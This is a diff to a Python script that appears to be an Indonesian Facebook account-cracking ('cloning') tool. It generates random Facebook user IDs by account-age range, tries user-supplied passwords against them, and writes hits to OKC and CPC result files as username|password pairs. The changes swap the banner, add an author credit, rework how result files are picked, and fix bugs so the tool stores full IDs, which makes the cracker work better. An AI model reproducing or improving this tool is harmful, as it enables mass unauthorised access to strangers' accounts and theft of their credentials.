@@ -27,9 +27,13 @@ except:
 	
 ###---[ SIMPLE LOGO ]---###	
 def logo():
-	return str(pyfiglet.figlet_format(' BLADE  CLON'))
+	return ("""   ____   _        ___    _   _   ___   _   _    ____
+  / ___| | |      / _ \  | \ | | |_ _| | \ | |  / ___|
+ | |     | |     | | | | |  \| |  | |  |  \| | | |  _
+ | |___  | |___  | |_| | | |\  |  | |  | |\  | | |_| |
+  \____| |_____|  \___/  |_| \_| |___| |_| \_|  \____|""")
 	
-		
+
 ###--[ GLOBAL NAME ]---###
 pro , dump = [] , []
 ok , cp , loop = 0 , 0 , 0
@@ -89,7 +93,7 @@ def save_hasil():
 		
 ###---[ MENU ]---###
 def menu_utama():	
-	print(logo())	
+	print(logo()+f'\n script by {kk}rochmat basuki{P}, github {kk}rozhbasxyz{P} version {kk}1.5{P}\n\n')	
 	if len(_)==5:pass
 	else:sys.exit(f' [{M}<{P}] hayo mau recode')
 	print(f' [{hh}1{P}]. cloning 2004-2006')
@@ -114,33 +118,34 @@ def menu_utama():
 ###---[CEK HASIL CRACK ]---###
 def cek_hasil():
 	no = 0
+	nom = []
 	one = input(f' [{hh}1{P}] cek hasil akun ok\n [{hh}2{P}] cek hasil akun cp\n menu : ')
 	if one in ['1','01']:
 		try:ok = os.listdir('OKC')
 		except:sys.exit(f" [{M}>{P}] tidak hasil ok")
 		if len(ok)==0:sys.exit(f" [{M}>{P}] tidak hasil ok")
 		for x in ok:
+			nom.append(x)
 			no+=1
 			print(f' [{hh}{no}{P}] {x}')
-		print('')
-		file = input(f' [{hh}<{P}] nama file : ')
+		bz = input(f' [{hh}<{P}] nomor file : ')
+		file = nom[int(bz)-1]
 		try:buka = open('OKC/'+file,'r').read()
 		except:sys.exit(f" [{M}>{P}] file tidak ada hasil ok")
-		print('')
-		print(hh+buka+P)
+		print(hh+" "+buka+P)
 	elif one in ['2','02']:
 		try:ok = os.listdir('CPC')
 		except:sys.exit(f" [{M}>{P}] tidak hasil cp")
 		if len(ok)==0:sys.exit(f" [{M}>{P}] tidak hasil cp")
 		for x in ok:
+			nom.append(x)
 			no+=1
 			print(f' [{kk}{no}{P}] {x}')
-		print('')
-		file = input(f' [{hh}<{P}] nama file : ')
+		bz = input(f' [{hh}<{P}] nomor file : ')
+		file = nom[int(bz)-1]
 		try:buka = open('CPC/'+file,'r').read()
 		except:sys.exit(f" [{M}>{P}] file tidak ada hasil cp")
-		print('')
-		print(kk+buka+P)
+		print(kk+" "+buka+P)
 	else:sys.exit(f" [{M}>{P}] isi yang benar")
 
 		
@@ -196,8 +201,8 @@ def cloning3():
 	tol = input(' total : ')
 	bas = input(' sandi : ').split(',')
 	for xyz in range(int(tol)):
-		A = '1000000'
-		B = rr(11111111, 99999999)
+		A = f'1{str(rr(1,4))}'
+		B = rr(11111111,99999999)
 		C = f'{A}{B}'
 		if C in dump:pass
 		else:dump.append(C)
@@ -223,7 +228,7 @@ def cloning4():
 		C = rr(111111111, 999999999)
 		D = f'{A}{B}{C}'
 		if D in dump:pass
-		else:dump.append(C)
+		else:dump.append(D)
 		print('\r sedang dump %s id'%(len(dump)),end='')
 		sys.stdout.flush()
 		sleep(0.0000003)
@@ -236,7 +241,7 @@ def cloning4():
 																														    ###----[ CLONING 2014-2022 ]---###
 def cloning5():
 	global ok , cp
-	print(f' [{hh}>{P}] cloning 2014-2022, 50% dapat hasil')
+	print(f' [{hh}>{P}] cloning 2010-2014, 50% dapat hasil')
 	tol = input(' total : ')
 	bas = input(' sandi : ').split(',')
 	for xyz in range(int(tol)): 
@@ -245,7 +250,7 @@ def cloning5():
 		C = rr(1111111111, 9999999999)
 		D = f'{A}{B}{C}'
 		if D in dump:pass
-		else:dump.append(C)
+		else:dump.append(D)
 		print('\r sedang dump %s id'%(len(dump)),end='')
 		sys.stdout.flush()
 		sleep(0.0000003)
@@ -322,6 +327,7 @@ class rozhbasxyz:
 					cp+=1
 					open('CPC/'+sim_cp,'a').write(user+'|'+pw+'\n')
 				else:
+					#print("facebook.com/"+user)
 					continue
 			except requests.exceptions.ConnectionError:
 				sleep(20)
